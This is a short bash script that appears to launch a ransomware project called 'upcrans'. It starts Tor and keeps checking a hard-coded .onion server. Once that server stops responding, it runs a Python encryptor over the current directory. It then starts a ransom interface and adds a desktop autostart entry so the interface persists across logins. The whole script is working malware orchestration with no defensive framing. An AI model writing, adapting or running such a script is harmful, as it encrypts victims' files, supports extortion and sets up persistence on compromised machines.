#!/bin/bash

echo "SCRIPT #WEBSERVER TOR"

#INSTALL DEPENDENCIES
/bin/bash Bash/dependencies.sh


#RUN TOR
service tor start


#VARIABLES
TOR_URL="62uxh4sdczcyr6tkndwy5mvr3xjhmobruq5vxymtzusddcew6deem2ad.onion"
TOR_PROXY="localhost:9050"
CURL_CMD="curl -s --socks5-hostname"
CURL_RETURN_CODE=0


#COMMAND TO CHECK SERVER
CURL_OUTPUT=`${CURL_CMD} ${TOR_PROXY} ${TOR_URL} 2> /dev/null` || CURL_RETURN_CODE=$?
echo "${CURL_OUTPUT}"


#LOOP TO CHECK IF SERVER UP
while  [ ${CURL_RETURN_CODE} -eq 0 ]
do
	echo "curl connection okey"
	CURL_OUTPUT=`${CURL_CMD} ${TOR_PROXY} ${TOR_URL} 2> /dev/null` || CURL_RETURN_CODE=$?

done


#EXECUTE RANSOMWARE
echo "curl connection fail"
python upcrans.py --encrypt --path .


#EXECUTE INTERFACE
/bin/bash Interface/proc1.sh


#ADD INTERFACE IN STARTUP
cd ~/.config/autostart/
touch upcrans2.desktop
echo '[Desktop Entry]' > upcrans2.desktop
echo 'Name=upcrans' >> upcrans2.desktop
echo 'Comment=Launch UPCRANS interface' >> upcrans2.desktop
echo 'Exec=/bin/bash /home/ruben/Documentos/RANS/MLW-Ransomware/Interface/proc1.sh' >> upcrans2.desktop
echo 'Type=Application' >> upcrans2.desktop